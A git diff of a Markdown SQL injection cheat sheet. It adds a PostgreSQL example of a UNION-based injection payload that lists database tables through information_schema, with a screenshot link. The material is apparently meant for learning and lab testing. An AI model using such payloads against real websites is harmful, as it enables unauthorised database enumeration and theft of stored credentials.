@@ -80,6 +80,8 @@ Copyright (c) Microsoft Corporation
 Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
 ```
 
+#
+
 ## Database contents
 *You can list the tables that exist in the database, and the columns that those tables contain.*
 
@@ -108,6 +110,14 @@ MyDatabase     dbo           Users       Username     varchar
 MyDatabase     dbo           Users       Password     varchar
 ```
 
+- Example of **PostgreSQL**printing tables. In the following coode server applies 2 columns. We replace one of those with **table_name**. 
+```sql
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+ ```
+
+![image](https://github.com/th3knv/sql_cheatsheets/assets/76121926/320a6b49-7f3d-4d7d-beda-f84a3fd7c4ca)
+
+#
 
 ## Conditional errors
 *You can test a single boolean condition and trigger a database error if the condition is true.*
